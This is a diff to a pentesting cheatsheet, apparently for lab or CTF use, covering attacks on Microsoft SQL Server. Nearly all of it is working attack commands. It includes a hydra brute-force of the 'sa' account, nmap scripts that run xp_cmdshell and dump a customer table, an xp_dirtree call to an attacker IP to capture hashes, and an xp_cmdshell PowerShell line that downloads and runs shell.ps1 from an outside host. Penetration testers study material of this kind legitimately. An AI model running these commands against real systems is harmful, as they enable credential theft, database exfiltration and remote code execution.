@@ -1,5 +1,10 @@
 # Cheatsheet
 
+## Brute-forcing 
+
+```
+ hydra -l sa –P /path/to/rockyou.txt 10.10.10.125 mssql
+```
 ## Nmap
 ```
 nmap –script "ms-sql and not ms-sql-brute" "–script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all" -d -oN mssql.nmap -Pn -v -sV –version-intensity 9 -T2 -p T:27900,U:1434 10.33.1.33
@@ -10,8 +15,13 @@ nmap -sV -T2 -Pn -n -sS –script=ms-sql-xp-cmdshell.nse -p1433 –script-args m
 
 nmap -v -sV –version-intensity 9 -T2 -p T:27900,U:1433 –script ms-sql-query –script-args mssql.username=sa,mssql.password=password,mssql.database=bankdb,ms-sql-query.query="SELECT * FROM tblCustomers" 10.33.1.33
 ```
-
+## Capture hash 
+Run responder and do:
+```
+xp_dirtree "\\10.10.14.8\test"
+```
 ## Enable xp_cmdshell
+`mssqlclient.py`  has `enable_xp_cmdshell`
 
 ```
 exec sp_configure 'show advanced options', 1
@@ -20,6 +30,9 @@ exec sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 ```
 
+```
+xp_cmdshell powershell iex(New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.8/shell.ps1\")
+```
 ## Disable xp_cmdshell
 ```
 exec sp_configure 'show advanced options', '1'
